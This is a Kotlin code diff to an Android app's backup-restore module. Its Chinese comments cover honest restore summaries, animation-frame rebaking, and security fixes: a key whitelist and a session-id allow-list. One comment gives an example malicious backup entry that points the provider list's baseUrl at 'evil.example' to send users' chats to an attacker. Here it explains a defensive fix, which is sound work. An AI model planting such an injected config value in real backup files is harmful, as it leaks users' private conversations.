+                sb.append("\n人设：").append(personaStat.keptByUser)
+                    .append(" 项保留了你现有的设置（备份里的更旧，未覆盖）")
+            }
         }
         if (animCount > 0) {
             sb.append("\n动作库：").append(animCount).append(" 只人偶的动作已写回")
         }
-        if (chatStat.sessions > 0) {
+        // 【chatStat 为 null = 聊天段没跑成】同上：不能说「新增 0 个会话」蒙过去。
+        if (chatStat != null && chatStat.sessions > 0) {
             sb.append("\n聊天记录：新增 ").append(chatStat.sessions).append(" 个会话")
             if (chatStat.messages > 0) {
                 sb.append("，共 ").append(chatStat.messages).append(" 条消息")
@@ -857,6 +1285,29 @@ object AllInOneArchive {
         }
         if (linksAdded > 0) {
             sb.append("，记忆连接 ").append(linksAdded).append(" 条")
+        }
+        // 【P1·超限必须说出来】`Mem.add` 超 200 条会砍最旧的，且**仍返回 true** ——
+        //   不说的话用户以为「备份里的记忆全恢复了」，实际最早那批（情感价值最高）没了。
+        //   这里报的是**因上限根本没写进去**的条数（restore 侧已改成写前拦截），
+        //   与「已写入」严格互斥，不重复计数。
+        if (memsSkippedByLimit > 0) {
+            sb.append("\n").append(memsSkippedByLimit)
+                .append(" 条记忆因超出上限（").append(Mem.MAX_ENTRIES)
+                .append(" 条/人偶）未写入")
+            if (memLimitedDolls.size == 1) {
+                val onlyId = memLimitedDolls.first()
+                val name = DollStore.byId(ctx, onlyId)?.name ?: ""
+                if (name.isNotEmpty()) {
+                    sb.append("，涉及「").append(name).append("」")
+                }
+            } else if (memLimitedDolls.size > 1) {
+                sb.append("，涉及 ").append(memLimitedDolls.size).append(" 只人偶")
+            }
+        }
+        if (linksSkippedByLimit > 0) {
+            sb.append("\n").append(linksSkippedByLimit)
+                .append(" 条记忆连接因超出上限（").append(Mem.MAX_LINKS)
+                .append(" 条/人偶）未写入")
         }
         if (profileFilled > 0) {
             sb.append("\n记忆画像：").append(profileFilled).append(" 只人偶已补齐")
@@ -873,6 +1324,15 @@ object AllInOneArchive {
             if (restored.filesWritten > 0) {
                 sb.append("\n图片写回 ").append(restored.filesWritten).append(" 张")
             }
+            // 【P1-3·必须如实报出失败】这些图**没写进去**，对应的人偶封面 / 头像 /
+            //   聊天背景会显示为默认或空白。不说的话，用户看到的是一句「恢复完成」，
+            //   然后自己发现图没了 —— 比一开始就说清楚更伤信任。
+            //   单独一行（不与上一行合并成「N 张，其中 M 张失败」），因为它读起来是
+            //   **警告**而不是统计，UI 也据此升级为「部分成功」。
+            if (restored.failedImages > 0) {
+                sb.append("\n").append(restored.failedImages)
+                    .append(" 张图片写回失败（封面 / 头像可能显示为默认）")
+            }
             if (old) {
                 sb.append("\n\n这是旧版备份，不含聊天记录 / 人设 / 图片。")
             }
@@ -884,7 +1344,26 @@ object AllInOneArchive {
                 //   否则用户恢复完点发送，得到 401，才发现根本没人告诉他密钥没跟着来。
                 sb.append("\n\n备份不含 API Key：现有供应商的密钥保持本机原值，若无法使用请重填。")
             }
-        sb.append("\n内置动作会在新机上按当前屏幕重新生成（这是正常的，不是丢动作）。")
+        // 【v0.2.8·修 P1·这句话以前是谎话】
+        //   改造前它写「内置动作会在新机上按当前屏幕重新生成（这是正常的，不是丢动作）」，
+        //   但当时**根本没有任何重生成**：导出把源机绝对 frames 路径原样带过来了，
+        //   恢复后 `frames` 非空 ⇒ `DollAnimPage` 判"有帧"直接用、不重烘 ⇒
+        //   解码全部失败 ⇒ 人偶停成一张静态图。那句提示让用户以为「坏了是正常的」，
+        //   于是连报障都不会报 —— 是本轮"界面不说谎"命题里最隐蔽的一处。
+        //
+        //   现在 [restoreAnim] 会真的清空并重烘，于是这句话才成立；但**必须带上真实数字**：
+        //   烘失败的那些不能含糊过去（`AnimBaker` 在缺少渲染环境时会返回空列表）。
+        val bake = animBakeStat()
+        if (bake.asked > 0) {
+            if (bake.ok >= bake.asked) {
+                sb.append("\n内置动作已按本机屏幕重新生成（").append(bake.ok).append(" 个）。")
+            } else {
+                sb.append("\n内置动作已按本机屏幕重新生成（")
+                    .append(bake.ok).append("/").append(bake.asked).append(" 个），")
+                    .append("其余 ").append(bake.asked - bake.ok)
+                    .append(" 个未能生成，可到「动作」页逐个点开重试。")
+            }
+        }
         sb.append("\n本次只做新增与补齐，没有删除你现有的任何数据。")
         return sb.toString()
     }
@@ -921,7 +1400,16 @@ object AllInOneArchive {
                     target.writeBytes(bytes)
                     out.filesWritten++
                 } catch (t: Throwable) {
+                    // 【P1-3·不许静默】这张图**没落到盘上**。以前只 Logs.w 后 continue，
+                    //   既不计数也不进摘要，用户看到的是绿色「恢复完成」，换机后却是
+                    //   空白封面 / 默认头像 —— 以为恢复成功，实际图丢了。
+                    //   这里计数，由 [restore] 的摘要如实报出。
+                    //
+                    //   注意 `continue` 保持了「失败不登记映射」这个正确行为：
+                    //   下面那些 `out.singles[...] = ...` / `out.frames[...] = ...`
+                    //   都不会执行，于是记录不会指向一个不存在的文件（无死链）。
                     Logs.w(TAG, "写回图片失败：" + rel, t)
+                    out.failedImages++
                     continue
                 }
             } else {
@@ -977,11 +1465,22 @@ object AllInOneArchive {
     }
 
     /**
-     * 人设写回：只写目标机**从来没有过**的键。
+     * 人设写回：只写目标机**从来没有过**的键，且**只写白名单内的键**。
      *
      * 【为什么不覆盖】人设是用户最主观的部分（性格、台词、手势映射）。
      *   恢复一份三个月前的备份就把她现在的性格盖回去，用户会当成「恢复把我改的东西弄没了」。
      *   新建的人偶本来就没有任何键，于是会完整继承 — 这正是想要的。
+     *
+     * 【P0 安全·为什么必须有白名单（本次修复）】
+     *   本段的键名 `k` **整条来自外部备份文件**，而备份文件是用户能从网上下载的东西，
+     *   属于**外部输入**，不能按「自己的导出格式」无条件信任。修复前这里唯一的闸门是
+     *   `p.contains(k)`（「目标机还没有这个键才写」），于是：
+     *     · 恶意备份塞 `{"k":"pv_list","v":"[{\"baseUrl\":\"https://evil.example/v1\"}]"}`
+     *     · 刚换新机、**还没配过供应商**的用户 `pv_list` 尚不存在 → 闸门放行
+     *     · 供应商列表被整体替换 → 之后**所有聊天明文 POST 到攻击者服务器**
+     *   所以「只写本机没有的键」是**功能口径**（不覆盖用户数据），
+     *   而「只写白名单内的键」是**安全口径**（不信任外部输入）—— 两者必须同时成立。
+     *   判据见 [isAllowedPersonaKey]（与导出侧共用 [personaKeysOf] + [isDangerousKey]）。
      *
      * 【为什么要吃 singles 映射】人设段里有一个**路径型**的键：`chatbg`
      *   （人偶独立的聊天背景图）。它存的是绝对路径，恢复后图落在了目标机的
@@ -990,14 +1489,15 @@ object AllInOneArchive {
      *   其余键都是标量（整数 / 布尔 / 文本），原样写回即可。
      *
      * @param singles 图片段的「归属|字段 → 目标机绝对路径」映射（见 [restoreImages]）
-     * @return 实际补了人设的人偶数
+     * @return 两项统计：真正补齐的人偶数 + 因「本机已有用户自己的值」而保留的键数
      */
-    private fun restorePersona(ctx: Context, section: JSONObject, singles: HashMap<String, String>): Int {
+    private fun restorePersona(ctx: Context, section: JSONObject, singles: HashMap<String, String>): PersonaStat {
+        val stat = PersonaStat()
         if (section.length() == 0) {
-            return 0
+            return stat
         }
         val p = PetPrefs.get(ctx)
-        var dolls = 0
+        var rejected = 0
         val keys = section.keys()
         while (keys.hasNext()) {
             val dollId = keys.next()
@@ -1013,7 +1513,43 @@ object AllInOneArchive {
             for (i in 0 until arr.length()) {
                 val o = arr.optJSONObject(i) ?: continue
                 val k = o.optString("k", "")
-                if (k.isEmpty() || p.contains(k)) {
+                if (k.isEmpty()) {
+                    continue
+                }
+                // 【P0 安全·键注入的唯一收口】键名 k 完全来自外部备份文件，**不能**直接信任。
+                //   修复前这里只有「非空 + 目标机不存在」两道闸门，于是恶意备份
+                //   塞一条 {"k":"pv_list"} 就能改写供应商列表、把 baseUrl 指向攻击者，
+                //   此后用户所有聊天明文都会 POST 出去。
+                //
+                //   判据 = 白名单（[isAllowedPersonaKey]，与导出侧同一份 [personaKeysOf]）
+                //         + 黑名单（[isDangerousKey]，纵深防御）。
+                //   注意顺序：**先拒绝后写盘**，rejected 只用于日志计数，绝不 e.put 任何东西。
+                if (!isAllowedPersonaKey(dollId, k)) {
+                    rejected++
+                    continue
+                }
+                // 【P0·本段最核心的判据】这个键要不要写 —— 见 [shouldWritePersonaKey]。
+                //
+                // 历史沿革（与 restoreChat 同一个模式，这里错了两次）：
+                //   ① `p.contains(k)` —— 判「本机有没有这个键」。但启动种子
+                //      `DollProfile.seedDefault()` 会在**首次启动**就给默认人偶写死
+                //      `persona` + `talk_lines`（裸键，见 DollProfile.key 对 DEFAULT_ID 的规则）。
+                //      于是换机用户的典型路径「新机装 App → 打开看一眼 → 导入备份」里，
+                //      这两个键**恒已存在** ⇒ 用户自己写的性格与台词**一个字都写不进去**，
+                //      而她说话用的是工厂 SYSTEM_PROMPT（性格完全不对）。
+                //      更糟的是摘要还报「人设：1 只人偶补齐了设定」—— 在说谎。
+                //   ② 现在：能区分「工厂写的」与「用户改过的」。
+                //      工厂常量为确定值（PetPrefs.SYSTEM_PROMPT / PetService.LINES_TAP），
+                //      所以直接**值比对**：当前值仍等于工厂值 → 用户没动过 → 允许备份覆盖。
+                if (!shouldWritePersonaKey(p, dollId, k)) {
+                    // 【说清楚】这个键本机已有**用户自己改过**的值，备份里的更新更旧，
+                    //   所以保留本机的。计数是为了让摘要能如实说出来（见 PersonaStat）。
+                    //
+                    //   直接累到 stat（而不是循环内的局部变量）：这个计数是**跨人偶**的，
+                    //   而每轮循环都要重新声明局部变量。更要紧的是——某只人偶**一个键都没写成**
+                    //   时（wrote==0 → 下面 continue）它保留的键也必须计入，那正是用户最需要的
+                    //   「我这只人偶一个字都没被改」这条信息。
+                    stat.keptByUser++
                     continue
                 }
                 // 背景图路径必须指到目标机真正写好的那份文件；没有新图就写空串，
@@ -1026,8 +1562,11 @@ object AllInOneArchive {
                     }
                     continue
                 }
-                putValue(e, o.optString("t", "s"), k, o)
-                wrote++
+                // putValue 自己做第二道防御（见该函数的判定），这里把它的返回值当作
+                // 「真的写进去了」才算 wrote：被拒的条目不该被算成「补齐了设定」。
+                if (putValue(e, o.optString("t", "s"), k, o)) {
+                    wrote++
+                }
             }
             if (wrote == 0) {
                 continue
@@ -1035,13 +1574,34 @@ object AllInOneArchive {
             // 用 commit：恢复是一次性动作，用户随后很可能立刻杀掉进程；
             // apply 的异步写在这个窗口里丢掉的话，表现是「恢复完重启又没了」。
             e.commit()
-            dolls++
+            stat.dolls++
         }
-        return dolls
+        if (rejected > 0) {
+            // 只记一行汇总，不逐键打日志：恶意备份里可能有上千条注入项，
+            // 逐条打印会把日志刷满，反而盖掉真正要排查的那一行。
+            Logs.w(TAG, "persona 段拒绝 " + rejected + " 个非法键（不在白名单或命中危险清单），已跳过")
+        }
+        return stat
     }
 
-    /** 按类型写一个偏好值；类型位不认识时按字符串兜底（比整条丢弃更接近用户预期）。 */
-    private fun putValue(e: SharedPreferences.Editor, t: String, key: String, o: JSONObject) {
+    /**
+     * 按类型写一个偏好值；类型位不认识时按字符串兜底（比整条丢弃更接近用户预期）。
+     *
+     * 【P0 安全】这个函数**不是**任意键通道。调用前必须已由 [isAllowedPersonaKey]
+     *   放行；这里再做一次独立防御（白名单 + 黑名单），因为「任意键写盘」这个能力
+     *   一旦扩散到别的 restore 段，就是一个比本次漏洞更大的洞。
+     *   命中危险键时**直接不写**并返回 false，调用方据此不计入 wrote。
+     */
+    private fun putValue(
+        e: SharedPreferences.Editor,
+        t: String,
+        key: String,
+        o: JSONObject
+    ): Boolean {
+        if (isDangerousKey(key)) {
+            Logs.w(TAG, "拒绝写入危险键（纵深防御）：" + key)
+            return false
+        }
         when (t) {
             "b" -> e.putBoolean(key, o.optBoolean("v", false))
             "i" -> e.putInt(key, o.optInt("v", 0))
@@ -1049,6 +1609,7 @@ object AllInOneArchive {
             "f" -> e.putFloat(key, o.optDouble("v", 0.0).toFloat())
             else -> e.putString(key, o.optString("v", ""))
         }
+        return true
     }
 
     /**
@@ -1071,6 +1632,10 @@ object AllInOneArchive {
         }
         val p = PetPrefs.get(ctx)
         var count = 0
+        // 【P1·内置动作待重烘清单】见 [exportAnim] 的说明与 [rebakeBuiltinFrames]。
+        //   收齐后**统一**重烘，而不是边写边烘：烘一帧要占主线程渲染，
+        //   夹在偏好写盘中间会让恢复的总耗时更难预测，也不好统计失败数。
+        val pending = ArrayList<Pair<String, String>>()
         val keys = section.keys()
         while (keys.hasNext()) {
             val dollId = keys.next()
@@ -1103,14 +1668,124 @@ object AllInOneArchive {
             val mineLen = parseArray(mineRaw).length()
             val mergedLen = merged.length()
             val rebound = rebindAnim(merged, frameMap)
-            // 只有在「本机本来就有动作库、且这次既没追加也没改写」时才可以跳过写盘。
-            if (!rebound && mergedLen == mineLen && mineRaw.isNotEmpty()) {
+            // 【P1·把内置动作的帧清空并登记重烘】
+            //   为什么必须清空：来源机的 `frames` 是**绝对路径**，本机不存在；
+            //   而 `DollAnimPage` 的判据是 `frames.isNotEmpty()` 就直接拿去播、**不会重烘**，
+            //   于是死链会一直留在档案里，画面停成静态图。
+            //   为什么不能只清空：[DollAnim.all] 按 id 判 `containsId` —— 动作条目已存在
+            //   就**不会**再补 frames，清空后没有任何东西会把它填回来，
+            //   结果从「看得见的死链」变成「看不见的空帧」（`PetView` 把空帧当合法无内容，
+            //   `return false` 且不打日志）。所以必须显式登记，交给 [rebakeBuiltinFrames]。
+            //
+            // 【只对 builtin 生效】用户自建动作的帧是真图片、已由图片段打包进来，
+            //   并由上面 rebindAnim 把旧绝对路径改成新绝对路径 —— 那些**不能清**。
+            var cleared = false
+            for (i in 0 until merged.length()) {
+                val a = merged.optJSONObject(i) ?: continue
+                if (!a.optBoolean("builtin", false)) {
+                    continue
+                }
+                val actionId = a.optString("id", "")
+                if (actionId.isEmpty()) {
+                    continue
+                }
+                a.put("frames", JSONArray())
+                a.put("asset_path", "")
+                cleared = true
+                pending.add(Pair(dollId, actionId))
+            }
+            // 只有在「本机本来就有动作库、且这次既没追加也没改写也没清空」时才跳过写盘。
+            if (!rebound && !cleared && mergedLen == mineLen && mineRaw.isNotEmpty()) {
                 continue
             }
             p.edit().putString(key, merged.toString()).commit()
             count++
         }
+        // 【重烘放在所有偏好写完之后】此时动作库里已经是「内置动作空帧」的状态，
+        //   重烘拿到的就是最终形态，不会被后面的写盘覆盖回去。
+        val baked = rebakeBuiltinFrames(ctx, pending)
+        lastAnimBakeStat = AnimBakeStat(pending.size, baked)
         return count
+    }
+
+    /**
+     * 一次恢复里内置动作重烘的结果（供摘要如实报告）。
+     *
+     * 【为什么用静态字段而不是改 restoreAnim 的返回类型】[restoreAnim] 的返回值
+     *   `Int` 是「写回了动作库的人偶数」，摘要里已经用它；再塞一个失败数会污染语义。
+     *   而改 `restore()` 的整条调用链会与并行进行的 UI 改造撞车。
+     *   这里沿用本类既有的 [lastSkippedImages] 同款做法。
+     *
+     * 【并发说明】恢复是用户在设置页触发的一次性串行动作（`SettingsScreen` 在
+     *   单条 `Thread{}` 里调），不存在两个恢复同时写这个字段的真实路径；
+     *   与 [lastSkippedImages] 的风险等级相同，不为它引入锁。
+     */
+    private class AnimBakeStat(val asked: Int, val ok: Int)
+
+    @Volatile
+    private var lastAnimBakeStat: AnimBakeStat = AnimBakeStat(0, 0)
+
+    /**
+     * 上一次恢复里「内置动作重烘」的统计；[asked] 为 0 表示本次没有需要重烘的动作。
+     *
+     * 供 [restore] 拼摘要用：**必须如实报数** —— 否则等于把「看得见的坏」
+     * （死链）换成「看不见的坏」（空帧静默不播）。
+     */
+    private fun animBakeStat(): AnimBakeStat {
+        return lastAnimBakeStat
+    }
+
+    /**
+     * 按本机屏幕重新烘一批内置动作的帧图，并把结果写回动作元数据。
+     *
+     * ## 为什么必须真的烘，不能只清空
+     * 见 [restoreAnim] 里那段说明：`DollAnim.all()` 只补**缺失的条目**，不补
+     * **已存在条目的空帧**。所以清空之后必须有人主动填。
+     *
+     * ## 为什么不用 `DefaultModelWarmup`
+     * 那个预热器有三个硬限定，**覆盖不到本场景**：
+     *   · `DollStore.DEFAULT_ID` —— 只服务默认人偶，用户的多只人偶完全不管；
+     *   · 只有 `SLOT_ALWAYS/DRAG/EDGE_IN/EDGE` **4 个固定位**，其余 15 个内置动作不管；
+     *   · 还要 `hasWindowFocus()`，且失败只重试 3 次（见 `DefaultModelWarmup.runNext`）。
+     * 依赖它 = 「默认人偶的 4 个动作能自愈，其余永久空帧」。
+     *
+     * ## 线程
+     * [AnimBaker.ensure] 的 KDoc 明写「可从任意线程调用」：它内部用 `onMain{}`
+     * 把渲染切回主线程，编码与落盘留在调用方线程。恢复本来就在后台线程跑，
+     * 所以这里**不要**再自己开线程。
+     *
+     * ## 比例口径（这里最容易错）
+     * 必须用**这只人偶自己的** `DollProfile.scale(dollId)`，不能全局 `PetPrefs.petScale`：
+     * `AnimBaker.bakeStamp` 把比例编进了烘帧版本号（见其注释），用错比例会导致
+     * ①帧的尺寸与桌宠实际显示对不上（糊或被裁）；②版本戳对不上，之后每次进动作页都重烘。
+     *
+     * @param pending (dollId, actionId) 清单
+     * @return 真正烘成功的动作数
+     */
+    private fun rebakeBuiltinFrames(ctx: Context, pending: List<Pair<String, String>>): Int {
+        if (pending.isEmpty()) {
+            return 0
+        }
+        var ok = 0
+        for ((dollId, actionId) in pending) {
+            try {
+                val scale = DollProfile.scale(ctx, dollId) / 100.0f
+                val out = AnimBaker.ensure(ctx, dollId, actionId, scale)
+                if (out.isEmpty()) {
+                    continue
+                }
+                val cur = DollAnim.byId(ctx, dollId, actionId)
+                // 【只填空的】防止把并发已经烘好的（或用户刚手工换过帧的）覆盖掉。
+                if (cur != null && cur.frames.isEmpty()) {
+                    DollAnim.update(ctx, dollId, cur.copy(frames = out))
+                    ok++
+                }
+            } catch (t: Throwable) {
+                // 单个动作烘失败不该让整次恢复中断 —— 但必须计数并进摘要。
+                Logs.w(TAG, "内置动作重烘失败：" + dollId + "/" + actionId, t)
+            }
+        }
+        return ok
     }
 
     /** 按动作 id 合并：以本机为准，只追加本机没有的条目。 */
@@ -1165,11 +1840,19 @@ object AllInOneArchive {
         return changed
     }
 
-    private fun restoreMemLinks(ctx: Context, section: JSONObject): Int {
+    /**
+     * 记忆连接写回。
+     *
+     * @param onSkipped 因超出 [Mem.MAX_LINKS] 而未写入的条数（回调式上报，见调用点）。
+     *        用回调而不是扩返回值：返回值 `Int` 已是「写入了多少条」，语义不能混。
+     * @return 实际写入的连接数
+     */
+    private fun restoreMemLinks(ctx: Context, section: JSONObject, onSkipped: (Int) -> Unit): Int {
         if (section.length() == 0) {
             return 0
         }
         var n = 0
+        var skipped = 0
         val keys = section.keys()
         while (keys.hasNext()) {
             val dollId = keys.next()
@@ -1179,11 +1862,21 @@ object AllInOneArchive {
             val arr = section.optJSONArray(dollId) ?: continue
             for (i in 0 until arr.length()) {
                 val o = arr.optJSONObject(i) ?: continue
+                // 【写入前查上限】同记忆条目：`Mem.addLink` 超 MAX_LINKS 会砍最旧的并返回 true，
+                //   靠它是静默丢失。先查再写，用户才知道有几条连接没恢复。
+                //   每次循环重查（不用缓存），理由同记忆段。
+                if (Mem.links(ctx, dollId).length() >= Mem.MAX_LINKS) {
+                    skipped++
+                    continue
+                }
                 // addLink 自带「同源同目标同类型去重」，重复恢复不会长出多条边。
                 if (Mem.addLink(ctx, dollId, MemLink.fromJson(o))) {
                     n++
                 }
             }
+        }
+        if (skipped > 0) {
+            onSkipped(skipped)
         }
         return n
     }
@@ -1211,6 +1904,26 @@ object AllInOneArchive {
             n++
         }
         return n
+    }
+
+    /**
+     * 人设恢复的统计。
+     *
+     * 【为什么需要 keptByUser，而不只是「写了几只」】`restorePersona` 的口径是
+     * 「键不存在 / 值是工厂种子 → 写；否则保留本机的」。于是用户改过性格时，
+     * 备份里的那份会被**正确地**跳过 —— 但这在摘要里**完全不可见**：
+     * `wrote==0` 就 `continue`，该人偶不计入任何数字，用户只看到一句「恢复完成」。
+     *
+     * 用户因此无从判断状态：是「没导进来」还是「导进来了但被我现在的人设挡住了」？
+     * 这两种情况的处理方式完全不同（前者要重试/找回备份，后者什么都不用做）。
+     * 所以必须把「保留了几项」如实说出来 —— 判对与说清楚是同一件事的两半。
+     */
+    private class PersonaStat {
+        /** 实际写入了设定的**人偶数**。 */
+        var dolls = 0
+
+        /** 因为「本机已有用户自己改过的值」而被保留的**键数**（跨人偶累计）。 */
+        var keptByUser = 0
     }
 
     /** 聊天恢复的统计。 */
@@ -1241,11 +1954,26 @@ object AllInOneArchive {
             val o = myIndex.optJSONObject(i) ?: continue
             have.add(o.optString("id", ""))
         }
+        // 【P0 安全·准入名单】只认「备份自己的会话清单里出现过」的 id。
+        //
+        // 为什么必须卡这一层：`items` / `prev` / `meta` 的**键名**来自备份文件，
+        // 而下面每一条都会拼进 SharedPreferences 的键（`conv_<id>`、`conv_read_<id>` …）。
+        // 不设准入时，外部文件里塞 `"<任意串>": {...}` 就能让恢复流程替它写一串键。
+        // 用「清单 ∋ id」这种**精确成员判定**而不是前缀/形态猜测 —— 猜测型校验
+        // 很容易被带下划线的构造绕过（同 personaKeysOf 的取舍）。
+        //
+        // 对正常备份零影响：[exportChat] 的 items/prev/meta **只遍历 conv_index 里的 id**，
+        // 所以真实备份必然满足这条准入。
+        val allowed = HashSet<String>()
         var indexChanged = false
         for (i in 0 until backupIndex.length()) {
             val o = backupIndex.optJSONObject(i) ?: continue
             val id = o.optString("id", "")
-            if (id.isEmpty() || !have.add(id)) {
+            if (id.isEmpty()) {
+                continue
+            }
+            allowed.add(id)
+            if (!have.add(id)) {
                 continue
             }
             myIndex.put(o)
@@ -1260,13 +1988,38 @@ object AllInOneArchive {
             val keys = items.keys()
             while (keys.hasNext()) {
                 val id = keys.next()
-                val raw = items.optString(id, "")
-                if (raw.isEmpty() || p.contains("conv_" + id)) {
+                if (!allowed.contains(id)) {
                     continue
                 }
-                PetPrefs.setConvHistory(ctx, id, raw)
-                out.sessions++
-                out.messages += countMessages(raw)
+                val raw = items.optString(id, "")
+                // 【P1·判据必须**两侧都判**，只判一侧就是在毁用户数据】
+                //
+                // 历史沿革（三个版本，前两版都错，且错的方向相反）：
+                //   ① 最早判 `p.contains("conv_" + id)` —— 判的是「本机有没有这个键」。
+                //      但那个键**几乎必然已存在**：`ChatSessions.addConv()` 每建一条会话
+                //      就无条件 `setConvHistory(ctx, id, "[]")`（写空数组），
+                //      `syncWithDolls()` 启动时又给每只人偶补建 `d_<dollId>`。
+                //      于是「键存在」恒为真 ⇒ **聊天一条都回不来**（功能失效）。
+                //   ② 修 ① 时改成了 `if (hasMessages(raw))` —— 但这个 raw 是**备份里**的值，
+                //      等于「备份里有消息就无条件覆盖本机」。而本机可能已有 50 条更近的对话，
+                //      导入一份旧备份就把它们**整体替换**掉（数据被毁）。
+                //      上一版的注释写着「真有消息就保留本机的」，实现却没读本机 ——
+                //      注释与实现相反，这正是缺陷能藏下来的原因。
+                //   ③ 现在（本版）：先读本机现值，两侧都判 ——
+                //      **本机没有内容** 且 **备份有内容** 才写。两个条件缺一不可：
+                //        · 缺「本机没有」→ 覆盖用户现有聊天（②的错）；
+                //        · 缺「备份有」  → 用空数组把本机预览清空（①的错）。
+                //
+                // 「有没有内容」用 [hasMessages] 判，而不是 `isNotEmpty()`：
+                // 键不存在(null) / `"[]"` / `"[ ]"` / 解析不出消息 一律算「没有」。
+                val existing = p.getString("conv_" + id, null)
+                if (!hasMessages(existing) && hasMessages(raw)) {
+                    PetPrefs.setConvHistory(ctx, id, raw)
+                    // 【计数只在真写入时累加】被跳过的会话不能算进「新增 N 个会话」，
+                    // 否则摘要会撒谎（用户以为恢复了，实际一条没动）。
+                    out.sessions++
+                    out.messages += countMessages(raw)
+                }
             }
         }
         val prev = section.optJSONObject("prev")
@@ -1274,11 +2027,17 @@ object AllInOneArchive {
             val keys = prev.keys()
             while (keys.hasNext()) {
                 val id = keys.next()
-                val raw = prev.optString(id, "")
-                if (raw.isEmpty() || p.contains("conv_" + id + "_prev")) {
+                if (!allowed.contains(id)) {
                     continue
                 }
-                PetPrefs.setConvPrev(ctx, id, raw)
+                val raw = prev.optString(id, "")
+                // 【P1·与 items 同一口径：两侧都判】`conv_<id>_prev` 存的是「更早的历史」，
+                //   同样会被无条件写覆盖。这里原本是 `if (!hasMessages(raw)) continue`
+                //   —— 只判备份侧就写，同样会顶掉本机已有的更早历史。
+                val existingPrev = p.getString("conv_" + id + "_prev", null)
+                if (!hasMessages(existingPrev) && hasMessages(raw)) {
+                    PetPrefs.setConvPrev(ctx, id, raw)
+                }
             }
         }
         // 展示层偏好：只补空的。
@@ -1287,6 +2046,9 @@ object AllInOneArchive {
             val keys = meta.keys()
             while (keys.hasNext()) {
                 val id = keys.next()
+                if (!allowed.contains(id)) {
+                    continue
+                }
                 val m = meta.optJSONObject(id) ?: continue
                 val curDoll = PetPrefs.convDoll(ctx, id)
                 val boundDoll = m.optString("doll", "")
@@ -1323,6 +2085,31 @@ object AllInOneArchive {
             PetPrefs.setConvPool(ctx, pool)
         }
         return out
+    }
+
+    /**
+     * 这段历史里**是否真的有消息**（`null` / `"[]"` / 空白一律算「没有」）。
+     *
+     * 【为什么不能用 `raw.isNotEmpty()` 代替】`addConv()` 给新会话写的占位值就是
+     *   非空的字符串 `"[]"`；用 isNotEmpty 判断会把它当成「备份里有内容」而写回，
+     *   等于把本机刚建的会话又覆盖成空 —— 既没恢复聊天，还可能清掉预览。
+     *
+     * 【为什么解析而不是直接比 `"[]"`】备份可能经过手工编辑或别的工具转发，
+     *   出现 `"[ ]"`、`"[\n]"` 这类空白变体时仍然要判成「没有」。
+     *   解析失败也按「没有」算：一个坏掉的历史值不值得覆盖本机记录。
+     */
+    private fun hasMessages(raw: String?): Boolean {
+        if (raw == null) {
+            return false
+        }
+        if (raw.isBlank() || raw.trim() == "[]") {
+            return false
+        }
+        return try {
+            parseArray(raw).length() > 0
+        } catch (t: Throwable) {
+            false
+        }
     }
 
     /** 一条会话里的消息条数（用于摘要；结构不认识就按 0 算，绝不因此让恢复失败）。 */
